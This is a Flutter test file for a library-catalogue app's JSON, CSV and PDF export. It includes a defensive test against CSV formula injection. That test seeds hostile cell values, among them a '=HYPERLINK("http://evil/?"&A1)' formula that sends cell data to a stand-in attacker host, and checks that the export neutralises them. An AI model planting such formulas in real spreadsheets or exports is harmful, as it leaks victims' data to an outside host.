import 'dart:convert';
import 'dart:typed_data';

import 'package:flutter/services.dart' show rootBundle;
import 'package:flutter_test/flutter_test.dart';
import 'package:fpdart/fpdart.dart';
import 'package:pitaka/core/error/failure.dart';
import 'package:pitaka/features/import_export/application/export_library_use_case.dart';
import 'package:pitaka/features/import_export/domain/export_source_filter.dart';
import 'package:pitaka/features/import_export/domain/pdf_column.dart';
import 'package:pitaka/features/import_export/domain/pdf_render_port.dart';
import 'package:pitaka/features/import_export/domain/pdf_render_progress.dart';
import 'package:pitaka/features/import_export/domain/pdf_text_raster.dart';
import 'package:pitaka/features/import_export/infrastructure/pdf_library_renderer.dart';
import 'package:pitaka/features/import_export/infrastructure/pitaka_json_exporter.dart';
import 'package:pitaka/features/import_export/infrastructure/pitaka_json_importer.dart';
import 'package:pitaka/features/library/domain/catalogue_item_page.dart';
import 'package:pitaka/features/library/domain/entities/catalogue_item.dart';
import 'package:pitaka/features/library/domain/library_query.dart';
import 'package:pitaka/features/library/domain/repositories/catalogue_item_repository.dart';
import 'package:pitaka/features/library/domain/value_objects/item_details.dart';
import 'package:pitaka/features/library/domain/value_objects/item_kind.dart';
import 'package:pitaka/features/periodicals/domain/entities/periodical.dart';
import 'package:pitaka/features/periodicals/domain/value_objects/periodical_frequency.dart';
import 'package:pitaka/features/wishlist/domain/entities/wishlist_book.dart';
import 'package:pitaka/features/wishlist/domain/repositories/wishlist_repository.dart';

import '../periodicals/application/periodical_fakes.dart';

class _Books implements CatalogueItemRepository {
  _Books(this._all);

  // CatalogueItemRepository additions (review 2026-09-03): fakes default to "no
  // match" and a pass-through transaction unless a test overrides them.
  @override
  Future<Either<Failure, CatalogueItem?>> findByUid(String itemUid) async =>
      right(null);
  @override
  Future<Either<Failure, T>> runInTransaction<T>(
    Future<Either<Failure, T>> Function() action,
  ) => action();
  final List<CatalogueItem> _all;
  @override
  Future<Either<Failure, List<CatalogueItem>>> getAll() async => right(_all);
  @override
  Future<Either<Failure, CatalogueItemPage>> page(
    LibraryQuery query, {
    required int limit,
    int offset = 0,
  }) async {
    final rows = query.isSearch ? const <CatalogueItem>[] : _all;
    final start = offset.clamp(0, rows.length);
    final end = (start + limit).clamp(start, rows.length);
    return right(
      CatalogueItemPage(
        items: rows.sublist(start, end),
        hasMore: end < rows.length,
      ),
    );
  }

  @override
  Future<Either<Failure, List<String>>> distinctLanguages() async =>
      right(const []);
  @override
  Future<Either<Failure, List<String>>> distinctSourceDetails(
    ItemSourceType type,
  ) async => right(const []);
  @override
  Future<Either<Failure, CatalogueItem?>> getById(int id) async => right(null);
  @override
  Future<Either<Failure, CatalogueItem?>> findByIsbn(String isbn) async =>
      right(null);
  @override
  Future<Either<Failure, CatalogueItem>> insert(CatalogueItem b) async =>
      right(b);
  @override
  Future<Either<Failure, CatalogueItem>> update(CatalogueItem b) async =>
      right(b);
  @override
  Future<Either<Failure, Unit>> markRemoved(int id, int at) async =>
      right(unit);
  @override
  Future<Either<Failure, Unit>> restoreRemoved(int id) async => right(unit);

  @override
  Future<Either<Failure, Unit>> delete(int id) async => right(unit);
  @override
  Future<Either<Failure, int>> insertAll(List<CatalogueItem> b) async =>
      right(b.length);
  @override
  Future<Either<Failure, int>> replaceAll(List<CatalogueItem> b) async =>
      right(b.length);
}

/// Records what the use case asked the PDF renderer to draw (the filtered
/// rows and the subtitle) instead of rendering, so the filter tests check
/// the contract without parsing PDF bytes.
class _RecordingRenderer implements LibraryPdfRenderer {
  List<CatalogueItem> books = const [];
  String? subtitle;

  @override
  Future<Uint8List> render({
    required String libraryName,
    required List<CatalogueItem> books,
    required List<PrintColumn> columns,
    required String footerAttribution,
    String? subtitle,
    PdfFontBundle regularFonts = const [],
    PdfFontBundle boldFonts = const [],
    Uint8List? logoBytes,
    Uint8List? footerIconBytes,
    PdfTextRasterizer? textRasterizer,
    PdfRenderProgressListener? onProgress,
    RenderCancelToken? cancelToken,
    int maxCachedTiles = PdfLibraryRenderer.defaultMaxCachedTiles,
  }) async {
    this.books = books;
    this.subtitle = subtitle;
    return Uint8List.fromList('%PDF-fake'.codeUnits);
  }
}

class _Wishlist implements WishlistRepository {
  _Wishlist(this._all);
  final List<WishlistBook> _all;
  @override
  Future<Either<Failure, List<WishlistBook>>> getAll() async => right(_all);
  @override
  Future<Either<Failure, WishlistBook?>> getById(int id) async => right(null);
  @override
  Future<Either<Failure, WishlistBook?>> findByIsbn(String i) async =>
      right(null);
  @override
  Future<Either<Failure, WishlistBook>> insert(WishlistBook b) async =>
      right(b);
  @override
  Future<Either<Failure, WishlistBook>> upsert(WishlistBook b) async =>
      right(b);
  @override
  Future<Either<Failure, WishlistBook>> update(WishlistBook b) async =>
      right(b);
  @override
  Future<Either<Failure, Unit>> delete(int id) async => right(unit);
  @override
  Future<Either<Failure, int>> insertAll(List<WishlistBook> b) async =>
      right(b.length);
}

void main() {
  // PDF font asset loading needs the test binding.
  TestWidgetsFlutterBinding.ensureInitialized();

  const books = [
    CatalogueItem(
      title: 'भारत: गांधी के बाद',
      author: 'Ramachandra Guha',
      isbn: '978-1',
      ageGroup: AgeGroup.advanced,
      sourceType: ItemSourceType.gift,
      language: 'Hindi',
      copyCount: 3,
      addedDate: 100,
      removed: true,
      removedAt: 200,
      addedBy: 'Khoj',
    ),
    CatalogueItem(title: 'Plain', addedDate: 50),
  ];
  const wishlist = [
    WishlistBook(
      title: 'Nexus',
      author: 'Harari',
      isbn: '222',
      priceEstimate: 19.99,
      priority: WishlistBook.priorityHigh,
      addedDate: 10,
    ),
  ];

  test('JSON export re-imports losslessly (round-trip)', () async {
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(books),
      wishlistRepo: _Wishlist(wishlist),
      periodicalRepo: FakePeriodicals(),
    );
    final result = await useCase(
      scope: ExportScope.both,
      format: ExportFormat.json,
      now: 999,
    );
    final export = result.getOrElse((f) => fail('export failed: $f'));
    expect(export.suggestedFileName, endsWith('.json'));

    final payload = const PitakaJsonImporter().parse(utf8.decode(export.bytes));
    expect(payload.parseErrors, isEmpty);
    expect(payload.items.length, 2);
    expect(payload.wishlist.length, 1);

    final b = payload.items.firstWhere((x) => x.isbn == '978-1');
    expect(b.title, 'भारत: गांधी के बाद');
    expect(b.author, 'Ramachandra Guha');
    expect(b.ageGroup, AgeGroup.advanced);
    expect(b.sourceType, ItemSourceType.gift);
    expect(b.language, 'Hindi');
    expect(b.copyCount, 3);
    expect(b.removed, isTrue);
    expect(b.removedAt, 200);
    expect(b.addedBy, 'Khoj');

    final w = payload.wishlist.single;
    expect(w.title, 'Nexus');
    expect(w.priceEstimate, 19.99);
    expect(w.priority, WishlistBook.priorityHigh);
  });

  test('scope libraryOnly excludes wishlist', () async {
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(books),
      wishlistRepo: _Wishlist(wishlist),
      periodicalRepo: FakePeriodicals(),
    );
    final result = await useCase(
      scope: ExportScope.libraryOnly,
      format: ExportFormat.json,
    );
    final export = result.getOrElse((f) => fail('failed: $f'));
    final payload = const PitakaJsonImporter().parse(utf8.decode(export.bytes));
    expect(payload.items.length, 2);
    expect(payload.wishlist, isEmpty);
  });

  test('CSV export has a header and one row per book', () async {
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(books),
      wishlistRepo: _Wishlist(wishlist),
      periodicalRepo: FakePeriodicals(),
    );
    final result = await useCase(
      scope: ExportScope.libraryOnly,
      format: ExportFormat.csv,
    );
    final export = result.getOrElse((f) => fail('failed: $f'));
    expect(export.suggestedFileName, endsWith('.csv'));
    final lines = utf8.decode(export.bytes).trim().split('\n');
    expect(lines.first, startsWith('title,author,isbn'));
    expect(lines.length, 3); // header + 2 books
  });

  // Regression for REVIEW_FINDINGS_2 S4 Major: a title/notes field planted
  // via merge or import (e.g. `=HYPERLINK("http://evil/?"&A1)`) must not
  // export as a bare formula cell that Excel/LibreOffice would execute.
  test('CSV export neutralises formula-leading cells (OWASP)', () async {
    const hostile = [
      CatalogueItem(title: '=1+1', addedDate: 1),
      CatalogueItem(title: '+cmd', addedDate: 2),
      CatalogueItem(title: '-2+3', addedDate: 3),
      CatalogueItem(title: '@SUM(A1)', addedDate: 4),
      CatalogueItem(title: '\ttabbed', addedDate: 5),
      CatalogueItem(
        title: '=HYPERLINK("http://evil/?"&A1),x',
        notes: 'safe',
        addedDate: 6,
      ),
      CatalogueItem(title: 'Normal title', addedDate: 7),
    ];
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(hostile),
      wishlistRepo: _Wishlist(const []),
      periodicalRepo: FakePeriodicals(),
    );
    final result = await useCase(
      scope: ExportScope.libraryOnly,
      format: ExportFormat.csv,
    );
    final export = result.getOrElse((f) => fail('failed: $f'));
    final lines = utf8.decode(export.bytes).trim().split('\n');
    // Every data row's first cell must start with the `'` text-marker, never
    // a bare formula character.
    for (var i = 1; i <= 5; i++) {
      expect(
        lines[i],
        startsWith("'"),
        reason: 'row $i must be quote-prefixed: ${lines[i]}',
      );
    }
    // The formula-with-comma case keeps the marker INSIDE the RFC4180 quotes.
    expect(lines[6], startsWith('"\'=HYPERLINK('));
    // Untouched: a normal title exports verbatim.
    expect(lines[7], startsWith('Normal title,'));
  });

  test('PDF export produces a valid PDF of the library list', () async {
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(books),
      wishlistRepo: _Wishlist(wishlist),
      periodicalRepo: FakePeriodicals(),
    );
    final result = await useCase(
      // Scope is ignored for PDF (always the library list); pass wishlistOnly
      // to prove the library still renders.
      scope: ExportScope.wishlistOnly,
      format: ExportFormat.pdf,
      now: 999,
      // The fixture has a Devanagari title; supply Latin + Devanagari faces so
      // the resolver can encode it (Helvetica alone would crash).
      pdfRegularFonts: [
        await rootBundle.load('assets/fonts/NotoSans-Regular.ttf'),
        await rootBundle.load('assets/fonts/NotoSansDevanagari-Regular.ttf'),
      ],
      pdfBoldFonts: [
        await rootBundle.load('assets/fonts/NotoSans-Bold.ttf'),
        await rootBundle.load('assets/fonts/NotoSansDevanagari-Bold.ttf'),
      ],
    );
    final export = result.getOrElse((f) => fail('pdf export failed: $f'));
    expect(export.suggestedFileName, endsWith('.pdf'));
    expect(export.mimeType, 'application/pdf');
    expect(String.fromCharCodes(export.bytes.take(5)), '%PDF-');
  });

  test('PDF export with a header logo still produces a valid PDF', () async {
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(books),
      wishlistRepo: _Wishlist(wishlist),
      periodicalRepo: FakePeriodicals(),
    );
    // Use the bundled app icon as a stand-in library logo (real PNG bytes the
    // renderer can decode). The header should draw it without erroring.
    final logo = (await rootBundle.load(
      'assets/branding/app_icon.png',
    )).buffer.asUint8List();
    final result = await useCase(
      scope: ExportScope.libraryOnly,
      format: ExportFormat.pdf,
      now: 1000,
      logoBytes: logo,
      pdfRegularFonts: [
        await rootBundle.load('assets/fonts/NotoSans-Regular.ttf'),
        await rootBundle.load('assets/fonts/NotoSansDevanagari-Regular.ttf'),
      ],
      pdfBoldFonts: [
        await rootBundle.load('assets/fonts/NotoSans-Bold.ttf'),
        await rootBundle.load('assets/fonts/NotoSansDevanagari-Bold.ttf'),
      ],
    );
    final export = result.getOrElse((f) => fail('pdf+logo export failed: $f'));
    expect(String.fromCharCodes(export.bytes.take(5)), '%PDF-');
  });

  group('source filter (CSV + PDF only)', () {
    const sourced = [
      CatalogueItem(
        title: 'Godaan',
        sourceType: ItemSourceType.donated,
        sourceDetail: 'Ram Sharma',
        addedDate: 4,
      ),
      CatalogueItem(
        title: 'Nirmala',
        sourceType: ItemSourceType.donated,
        sourceDetail: 'ram sharma',
        addedDate: 3,
      ),
      CatalogueItem(
        title: 'Gaban',
        sourceType: ItemSourceType.donated,
        sourceDetail: 'Sita Devi',
        addedDate: 2,
      ),
      CatalogueItem(
        title: 'Karmabhoomi',
        sourceType: ItemSourceType.purchased,
        sourceDetail: 'Ram Sharma',
        addedDate: 1,
      ),
      CatalogueItem(title: 'Sevasadan'),
    ];
    final useCase = ExportLibraryUseCase(
      jsonEncoder: const PitakaJsonExporter(),
      pdfRenderer: const PdfLibraryRenderer(),
      bookRepo: _Books(sourced),
      wishlistRepo: _Wishlist(const []),
      periodicalRepo: FakePeriodicals(),
    );

    test('CSV by type keeps only that type and tags the file name', () async {
      final result = await useCase(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.csv,
        sourceFilter: ExportSourceFilter.byType(ItemSourceType.donated),
        now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
      );
      final export = result.getOrElse((f) => fail('failed: $f'));
      expect(export.suggestedFileName, 'pitak-library-donated-20261015.csv');
      final lines = utf8.decode(export.bytes).trim().split('\n');
      expect(lines.length, 4); // header + 3 donated
      expect(lines.skip(1).map((l) => l.split(',').first), [
        'Godaan',
        'Nirmala',
        'Gaban',
      ]);
    });

    test('CSV by type + detail matches case-insensitively', () async {
      final result = await useCase(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.csv,
        sourceFilter: ExportSourceFilter.byType(
          ItemSourceType.donated,
          detail: 'Ram Sharma',
        ),
        now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
      );
      final export = result.getOrElse((f) => fail('failed: $f'));
      expect(
        export.suggestedFileName,
        'pitak-library-donated-ram-sharma-20261015.csv',
      );
      final lines = utf8.decode(export.bytes).trim().split('\n');
      // Both spellings of the donor; NOT the purchase from the same person.
      expect(lines.skip(1).map((l) => l.split(',').first), [
        'Godaan',
        'Nirmala',
      ]);
    });

    test('PDF by detail renders the subset under a subtitle', () async {
      final renderer = _RecordingRenderer();
      final pdfUseCase = ExportLibraryUseCase(
        jsonEncoder: const PitakaJsonExporter(),
        pdfRenderer: renderer,
        bookRepo: _Books(sourced),
        wishlistRepo: _Wishlist(const []),
        periodicalRepo: FakePeriodicals(),
      );
      final result = await pdfUseCase(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.pdf,
        sourceFilter: ExportSourceFilter.byType(
          ItemSourceType.donated,
          detail: 'Sita Devi',
        ),
        now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
      );
      final export = result.getOrElse((f) => fail('failed: $f'));
      expect(export.suggestedFileName, 'pitak-donated-sita-devi-20261015.pdf');
      expect(renderer.subtitle, 'Donated by Sita Devi');
      expect(renderer.books.map((b) => b.title), ['Gaban']);
    });

    test('an unfiltered PDF has no subtitle and the classic name', () async {
      final renderer = _RecordingRenderer();
      final pdfUseCase = ExportLibraryUseCase(
        jsonEncoder: const PitakaJsonExporter(),
        pdfRenderer: renderer,
        bookRepo: _Books(sourced),
        wishlistRepo: _Wishlist(const []),
        periodicalRepo: FakePeriodicals(),
      );
      final result = await pdfUseCase(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.pdf,
        now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
      );
      final export = result.getOrElse((f) => fail('failed: $f'));
      expect(export.suggestedFileName, 'pitak-20261015.pdf');
      expect(renderer.subtitle, isNull);
      expect(renderer.books, hasLength(5));
    });

    test(
      'a non-Latin detail names the PDF by type only, subtitle in full',
      () async {
        final renderer = _RecordingRenderer();
        final pdfUseCase = ExportLibraryUseCase(
          jsonEncoder: const PitakaJsonExporter(),
          pdfRenderer: renderer,
          bookRepo: _Books(const [
            CatalogueItem(
              title: 'गोदान',
              sourceType: ItemSourceType.gift,
              sourceDetail: 'राम शर्मा',
            ),
          ]),
          wishlistRepo: _Wishlist(const []),
          periodicalRepo: FakePeriodicals(),
        );
        final result = await pdfUseCase(
          scope: ExportScope.libraryOnly,
          format: ExportFormat.pdf,
          sourceFilter: ExportSourceFilter.byType(
            ItemSourceType.gift,
            detail: 'राम शर्मा',
          ),
          now: DateTime(2026, 10, 15).millisecondsSinceEpoch,
        );
        final export = result.getOrElse((f) => fail('failed: $f'));
        expect(export.suggestedFileName, 'pitak-gift-20261015.pdf');
        expect(renderer.subtitle, 'Gift from राम शर्मा');
        expect(renderer.books, hasLength(1));
      },
    );

    test(
      'JSON ignores the filter: a backup is always the whole library',
      () async {
        final result = await useCase(
          scope: ExportScope.libraryOnly,
          format: ExportFormat.json,
          sourceFilter: ExportSourceFilter.byType(ItemSourceType.donated),
        );
        final export = result.getOrElse((f) => fail('failed: $f'));
        expect(export.suggestedFileName, endsWith('.json'));
        final payload = const PitakaJsonImporter().parse(
          utf8.decode(export.bytes),
        );
        expect(payload.items, hasLength(5));
      },
    );
  });

  test('exporter omits null fields but keeps required ones', () {
    final json = const PitakaJsonExporter().export(
      books: const [CatalogueItem(title: 'Only')],
      wishlist: const [],
      periodicals: const [],
      exportedAt: 1,
    );
    expect(json, contains('"title": "Only"'));
    expect(json, isNot(contains('"author"')));
    expect(json, contains('"schemaVersion": 4'));
    // W1: the kind is written explicitly; an empty periodicals list is omitted.
    expect(json, contains('"kind": "book"'));
    expect(json, isNot(contains('"periodicals"')));
  });

  test('exporter emits libraryId/libraryName the importer reads back', () {
    const exporter = PitakaJsonExporter();
    final json = exporter.export(
      books: const [CatalogueItem(title: 'B')],
      wishlist: const [],
      periodicals: const [],
      exportedAt: 1,
      libraryId: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
      libraryName: 'Riverside',
    );
    final env = const PitakaJsonImporter().parseEnvelope(json);
    expect(env.libraryId, 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa');
    expect(env.libraryName, 'Riverside');
  });

  test('exporter omits blank libraryId/libraryName from the envelope', () {
    final json = const PitakaJsonExporter().export(
      books: const [CatalogueItem(title: 'B')],
      wishlist: const [],
      periodicals: const [],
      exportedAt: 1,
    );
    expect(json, isNot(contains('"libraryId"')));
    expect(json, isNot(contains('"libraryName"')));
  });

  group('schema v4 (ADR 0014 W1)', () {
    /// A series, one plain book, one other and one of its issues — the full
    /// kind census of a v4 document.
    const series = Periodical(
      id: 1,
      periodicalUid: 'per-1',
      title: 'Frontline',
      issn: '1234-5679',
      publisher: 'THG',
      language: 'English',
      frequency: PeriodicalFrequency.monthly,
      subscriptionStart: 100,
      subscriptionEnd: 200,
      addedDate: 50,
    );
    const items = [
      CatalogueItem(itemUid: 'b1', title: 'Plain', addedDate: 10),
      CatalogueItem(
        itemUid: 'o1',
        title: 'Carrom board',
        notes: 'family set',
        addedDate: 20,
        details: OtherItemOf(),
      ),
      CatalogueItem(
        itemUid: 'i1',
        title: 'Frontline — No 5',
        publisher: 'THG',
        addedDate: 30,
        details: IssueOf(
          periodicalUid: 'per-1',
          issueNumber: 5,
          issueDate: 1759276800000,
          label: 'Festive number',
        ),
      ),
    ];

    ExportLibraryUseCase useCaseWith({List<CatalogueItem> rows = items}) =>
        ExportLibraryUseCase(
          jsonEncoder: const PitakaJsonExporter(),
          pdfRenderer: const PdfLibraryRenderer(),
          bookRepo: _Books(rows),
          wishlistRepo: _Wishlist(const []),
          periodicalRepo: FakePeriodicals()..seed(series),
        );

    test('JSON round-trips all three kinds and the periodicals list', () async {
      final result = await useCaseWith()(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.json,
        now: 999,
      );
      final export = result.getOrElse((f) => fail('export failed: $f'));
      final payload = const PitakaJsonImporter().parse(
        utf8.decode(export.bytes),
      );
      expect(payload.parseErrors, isEmpty);

      final p = payload.periodicals.single;
      expect(p.title, 'Frontline');
      expect(p.periodicalUid, 'per-1');
      expect(p.issn, '1234-5679');
      expect(p.frequency, PeriodicalFrequency.monthly);
      expect(p.subscriptionEnd, 200);

      expect(payload.items, hasLength(3));
      final book = payload.items.firstWhere((b) => b.itemUid == 'b1');
      expect(book.kind, ItemKind.book);
      expect(book.details, isNull);
      final other = payload.items.firstWhere((b) => b.itemUid == 'o1');
      expect(other.kind, ItemKind.other);
      expect(other.details, isA<OtherItemOf>());
      expect(other.notes, 'family set');
      final issue = payload.items.firstWhere((b) => b.itemUid == 'i1');
      expect(issue.kind, ItemKind.magazineIssue);
      expect(
        issue.details,
        isA<IssueOf>()
            .having((d) => d.periodicalUid, 'periodicalUid', 'per-1')
            .having((d) => d.issueNumber, 'issueNumber', 5)
            .having((d) => d.issueDate, 'issueDate', 1759276800000)
            .having((d) => d.label, 'label', 'Festive number'),
      );
      // The projected base fields ride along as plain columns (D3).
      expect(issue.title, 'Frontline — No 5');
      expect(issue.publisher, 'THG');
    });

    test('CSV gains the kind columns and resolves the series title', () async {
      final result = await useCaseWith()(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.csv,
        now: 999,
      );
      final export = result.getOrElse((f) => fail('failed: $f'));
      final lines = utf8.decode(export.bytes).trim().split('\n');
      expect(
        lines.first,
        endsWith(
          ',Kind,Series,Volume,Issue,Issue date,Bound until,Issue label',
        ),
        reason: 'the classic columns keep their positions',
      );
      expect(lines, hasLength(4)); // header + 3 rows

      final bookRow = lines[1].split(',');
      expect(
        bookRow.sublist(11),
        ['Book', '', '', '', '', '', ''],
        reason: 'a book row leaves the kind columns blank after Kind',
      );

      final issueRow = lines[3].split(',');
      expect(issueRow[11], 'Magazine issue');
      expect(issueRow[12], 'Frontline', reason: 'series title by uid');
      expect(issueRow[14], '5');
      expect(issueRow[15], '2025-10-01');
      expect(issueRow[16], '', reason: 'not a bound volume');
      expect(issueRow[17], 'Festive number');

      final otherRow = lines[2].split(',');
      expect(otherRow[11], 'Other');
    });

    test('a hostile series title is quote-prefixed in CSV (OWASP)', () async {
      final hostile = FakePeriodicals()
        ..seed(const Periodical(title: '=EVIL()', periodicalUid: 'per-1'));
      final useCase = ExportLibraryUseCase(
        jsonEncoder: const PitakaJsonExporter(),
        pdfRenderer: const PdfLibraryRenderer(),
        bookRepo: _Books(const [
          CatalogueItem(
            title: 'Safe title',
            details: IssueOf(periodicalUid: 'per-1', issueNumber: 1),
          ),
        ]),
        wishlistRepo: _Wishlist(const []),
        periodicalRepo: hostile,
      );
      final result = await useCase(
        scope: ExportScope.libraryOnly,
        format: ExportFormat.csv,
      );
      final export = result.getOrElse((f) => fail('failed: $f'));
      final row = utf8.decode(export.bytes).trim().split('\n')[1];
      expect(
        row.split(',')[12],
        startsWith("'"),
        reason: 'the series cell must never open as a formula: $row',
      );
    });
  });
}
